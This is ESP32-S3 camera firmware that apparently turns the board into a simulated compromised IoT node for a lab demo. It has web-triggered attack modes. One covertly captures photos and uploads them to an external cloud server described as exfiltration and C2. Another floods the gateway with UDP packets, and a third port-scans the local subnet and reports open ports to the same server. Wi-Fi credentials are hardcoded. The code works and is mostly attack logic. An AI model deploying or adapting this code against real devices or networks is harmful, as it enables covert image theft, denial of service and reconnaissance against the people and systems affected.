#include "esp_camera.h"
#include <WiFi.h>
#include <HTTPClient.h>
#include <WebServer.h>
#include <WiFiUdp.h>

// ==========================================
// 1. CREDENTIALS & ENDPOINTS
// ==========================================
const char* ssid = "Cipher_IoT_Net";
const char* password = "cipher2024";

// Google Cloud VM IP for Image Exfiltration
const char* gcpUploadUrl = "http://35.212.229.239:5000/api/upload"; 
const char* gcpReconUrl = "http://35.212.229.239:5000/api/recon/report";

// Raspberry Pi Relay IP for Heartbeats
const char* rpiHeartbeatUrl = "http://10.42.0.1:5000/heartbeat";

// DDoS Target IP (Usually the Gateway/RPi or an external server)
const char* ddosTargetIP = "10.42.0.1"; 

// ==========================================
// 2. CAMERA PINS (ESP32-S3-EYE)
// ==========================================
#define PWDN_GPIO_NUM  -1
#define RESET_GPIO_NUM -1
#define XCLK_GPIO_NUM  15
#define SIOD_GPIO_NUM  4
#define SIOC_GPIO_NUM  5

#define Y2_GPIO_NUM 11
#define Y3_GPIO_NUM 9
#define Y4_GPIO_NUM 8
#define Y5_GPIO_NUM 10
#define Y6_GPIO_NUM 12
#define Y7_GPIO_NUM 18
#define Y8_GPIO_NUM 17
#define Y9_GPIO_NUM 16

#define VSYNC_GPIO_NUM 6
#define HREF_GPIO_NUM  7
#define PCLK_GPIO_NUM  13

// ==========================================
// 3. GLOBAL VARIABLES & STATE
// ==========================================
WebServer server(80);
WiFiUDP udp;

enum AttackState {
  IDLE,
  EXFILTRATION,
  DDOS_FLOOD,
  PORT_SCAN
};
AttackState currentState = IDLE;

// Timing variables
unsigned long lastHeartbeatTime = 0;
const unsigned long HEARTBEAT_INTERVAL = 10000; // 10 seconds

unsigned long lastExfilTime = 0;
const unsigned long EXFIL_INTERVAL = 500; // 500 ms

unsigned long lastScanTime = 0;
const unsigned long SCAN_INTERVAL = 200; // Fast port scan (200ms per IP)

int currentScanIP = 2; // For port scanning (192.168.4.X)

// ==========================================
// 4. FUNCTION PROTOTYPES
// ==========================================
void sendHeartbeat();
void captureAndUpload();
void performDDoSFlood();
void performPortScan();

void handleTriggerExfil();
void handleTriggerDDoS();
void handleTriggerScan();
void handleStop();
void handlePing();

// ==========================================
// 5. SETUP
// ==========================================
void setup() {
  Serial.begin(115200);
  Serial.println();

  // Configure Camera
  camera_config_t config;
  config.ledc_channel = LEDC_CHANNEL_0;
  config.ledc_timer = LEDC_TIMER_0;
  config.pin_d0 = Y2_GPIO_NUM;
  config.pin_d1 = Y3_GPIO_NUM;
  config.pin_d2 = Y4_GPIO_NUM;
  config.pin_d3 = Y5_GPIO_NUM;
  config.pin_d4 = Y6_GPIO_NUM;
  config.pin_d5 = Y7_GPIO_NUM;
  config.pin_d6 = Y8_GPIO_NUM;
  config.pin_d7 = Y9_GPIO_NUM;
  config.pin_xclk = XCLK_GPIO_NUM;
  config.pin_pclk = PCLK_GPIO_NUM;
  config.pin_vsync = VSYNC_GPIO_NUM;
  config.pin_href = HREF_GPIO_NUM;
  config.pin_sccb_sda = SIOD_GPIO_NUM;
  config.pin_sccb_scl = SIOC_GPIO_NUM;
  config.pin_pwdn = PWDN_GPIO_NUM;
  config.pin_reset = RESET_GPIO_NUM;
  config.xclk_freq_hz = 20000000;
  
  config.grab_mode = CAMERA_GRAB_WHEN_EMPTY;
  
  // Using RGB565 to bypass any hardware JPEG limits, converting in software
  config.pixel_format = PIXFORMAT_RGB565; 

  if (psramFound()) {
    config.frame_size = FRAMESIZE_VGA; 
    config.fb_location = CAMERA_FB_IN_PSRAM;
    config.fb_count = 2;
  } else {
    config.frame_size = FRAMESIZE_QVGA; 
    config.fb_location = CAMERA_FB_IN_DRAM;
    config.fb_count = 1;
  }

  // Initialize the camera
  esp_err_t err = esp_camera_init(&config);
  if (err != ESP_OK) {
    Serial.printf("Camera init failed with error 0x%x\n", err);
    return;
  }
  
  sensor_t *s = esp_camera_sensor_get();
  // S3-EYE cameras often need to be vertically flipped to be right-side up
  if (s) {
    s->set_vflip(s, 1);
  }
  
  Serial.println("Camera Initialized successfully!");

  // Connect to WiFi
  WiFi.mode(WIFI_STA); // Explicitly set to Station mode
  WiFi.disconnect();   // Clear previous saved credentials from NVS memory
  delay(100);

  WiFi.begin(ssid, password);
  Serial.print("Connecting to WiFi");
  
  unsigned long startTime = millis();
  while (WiFi.status() != WL_CONNECTED) {
    // Feed the watchdog and yield to RTOS tasks to prevent crash
    yield();
    delay(500);
    Serial.print(".");
    
    // 20 second timeout
    if (millis() - startTime > 20000) {
      Serial.println("\nWiFi connection timed out!");
      break;
    }
  }
  
  if (WiFi.status() != WL_CONNECTED) {
    Serial.println("\nFailed to connect to WiFi!");
    Serial.println("Troubleshooting tips:");
    Serial.println("1. Check if SSID and Password are correct.");
    Serial.println("2. ESP32 ONLY supports 2.4GHz networks (not 5GHz).");
    Serial.println("3. Restart the router or the ESP32.");
  } else {
    Serial.println("\nWiFi Connected!");
    Serial.print("IP Address: ");
    Serial.println(WiFi.localIP());
  }

  // Setup Web Server Routes
  server.on("/trigger/exfil", HTTP_POST, handleTriggerExfil);
  server.on("/trigger/ddos", HTTP_POST, handleTriggerDDoS);
  server.on("/trigger/scan", HTTP_POST, handleTriggerScan);
  server.on("/stop", HTTP_POST, handleStop);
  server.on("/ping", HTTP_GET, handlePing);
  
  server.begin();
  Serial.println("HTTP server started");
}

// ==========================================
// 6. MAIN LOOP
// ==========================================
void loop() {
  server.handleClient(); // Always handle incoming HTTP requests

  unsigned long currentMillis = millis();

  switch (currentState) {
    case IDLE:
      // Normal Mode: Send periodic heartbeats
      if (currentMillis - lastHeartbeatTime >= HEARTBEAT_INTERVAL) {
        lastHeartbeatTime = currentMillis;
        sendHeartbeat();
      }
      break;

    case EXFILTRATION:
      // Attack 1: Data Exfiltration (Photos)
      if (currentMillis - lastExfilTime >= EXFIL_INTERVAL) {
        lastExfilTime = currentMillis;
        captureAndUpload();
      }
      break;

    case DDOS_FLOOD:
      // Attack 2: UDP Flood (High Packet Rate)
      performDDoSFlood(); 
      break;

    case PORT_SCAN:
      // Attack 3: Lateral Movement / Reconnaissance
      if (currentMillis - lastScanTime >= SCAN_INTERVAL) {
        lastScanTime = currentMillis;
        performPortScan();
      }
      break;
  }
}

// ==========================================
// 7. WEB SERVER HANDLERS
// ==========================================
void handleTriggerExfil() {
  currentState = EXFILTRATION;
  server.send(200, "text/plain", "Attack Started: Data Exfiltration");
  Serial.println("TRIGGER: Data Exfiltration started");
}

void handleTriggerDDoS() {
  currentState = DDOS_FLOOD;
  server.send(200, "text/plain", "Attack Started: DDoS Flood");
  Serial.println("TRIGGER: DDoS Flood started");
}

void handleTriggerScan() {
  currentState = PORT_SCAN;
  currentScanIP = 1; // Reset scan counter to include Gateway
  server.send(200, "text/plain", "Attack Started: Port Scanning");
  Serial.println("TRIGGER: Port Scanning started");
}

void handleStop() {
  currentState = IDLE;
  server.send(200, "text/plain", "Attacks Stopped: Returned to idle mode");
  Serial.println("STOP: Returning to heartbeat mode");
}

void handlePing() {
  server.send(200, "text/plain", "pong");
}

// ==========================================
// 8. ACTIONS / ATTACK LOGIC
// ==========================================

// --- THE GOOD GUY ROUTINE ---
void sendHeartbeat() {
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("Sending heartbeat...");
    HTTPClient http;
    http.begin(rpiHeartbeatUrl);
    
    int httpResponseCode = http.GET();
    if (httpResponseCode > 0) {
      Serial.printf("Heartbeat sent. Response code: %d\n", httpResponseCode);
    }
    http.end();
  }
}

// --- ATTACK 1: EXFILTRATION ---
void captureAndUpload() {
  Serial.println("Taking photo and exfiltrating...");
  
  // 1. Capture the raw frame
  camera_fb_t * fb = esp_camera_fb_get();
  if (!fb) {
    Serial.println("Camera capture failed!");
    return;
  }

  // 2. Convert to JPEG
  uint8_t * jpeg_buf = NULL;
  size_t jpeg_len = 0;
  bool converted = frame2jpg(fb, 80, &jpeg_buf, &jpeg_len); 
  
  esp_camera_fb_return(fb); // Free raw frame memory immediately

  if (!converted) {
    Serial.println("JPEG compression failed!");
    return;
  }

  // 3. Send to Google Cloud VPS
  if (WiFi.status() == WL_CONNECTED) {
    HTTPClient http;
    http.begin(gcpUploadUrl);
    http.addHeader("Content-Type", "image/jpeg");
    http.addHeader("X-Device-ID", "esp32-cam-01"); 

    int httpResponseCode = http.POST(jpeg_buf, jpeg_len);
    if (httpResponseCode > 0) {
      Serial.printf("Exfiltration Success! Response: %d\n", httpResponseCode);
    }
    http.end();
  }
  
  // 4. Clean up JPEG buffer
  free(jpeg_buf); 
}

// --- ATTACK 2: DDOS FLOOD ---
void performDDoSFlood() {
  // Blast 50 UDP packets in a burst
  for (int i = 0; i < 50; i++) {
    udp.beginPacket("10.42.0.1", 8080); // Target the RPi Gateway directly
    // Add a bit of random noise to the payload
    char junk[32];
    sprintf(junk, "MALICIOUS_DATA_%04d", random(1000, 9999));
    udp.write((const uint8_t*)junk, 20);
    udp.endPacket();
    yield(); // Keep WiFi stack happy
  }
  // Short delay to let the chip breathe but keep rate high
  delay(10); 
}

// --- ATTACK 3: PORT SCANNING ---
void performPortScan() {
  char targetIP[20];
  sprintf(targetIP, "10.42.0.%d", currentScanIP); // Use RPi Hotspot Subnet
  
  Serial.printf("Scanning IP: %s...\n", targetIP);
  
  int commonPorts[] = {21, 22, 80, 443, 554, 1883, 5000, 8080, 8443};
  String openPortsJson = "";
  bool foundOpen = false;

  for (int i = 0; i < 9; i++) {
    int port = commonPorts[i];
    WiFiClient client;
    client.setTimeout(0.1); // Extremely fast (100ms)

    if (client.connect(targetIP, port)) {
      Serial.printf("  -> Port %d OPEN!\n", port);
      if (foundOpen) openPortsJson += ",";
      openPortsJson += String(port);
      foundOpen = true;
      client.stop();
    }
    yield(); // Avoid watchdog trigger
  }

  // If we found any open ports, report them to the C2
  if (foundOpen && WiFi.status() == WL_CONNECTED) {
    HTTPClient http;
    http.begin(gcpReconUrl);
    http.addHeader("Content-Type", "application/json");
    
    String payload = "{\"ip\":\"" + String(targetIP) + "\",\"ports\":[" + openPortsJson + "],\"device\":\"IoT Node\"}";
    
    int httpResponseCode = http.POST(payload);
    if (httpResponseCode > 0) {
      Serial.printf("Recon Report Sent: %d\n", httpResponseCode);
    }
    http.end();
  }

  // Move to next IP
  currentScanIP++;
  if (currentScanIP > 25) { // Only scan the first 25 IPs for faster demo results
    currentScanIP = 2; // Reset loop (1 is usually the RPi gateway)
  }
}
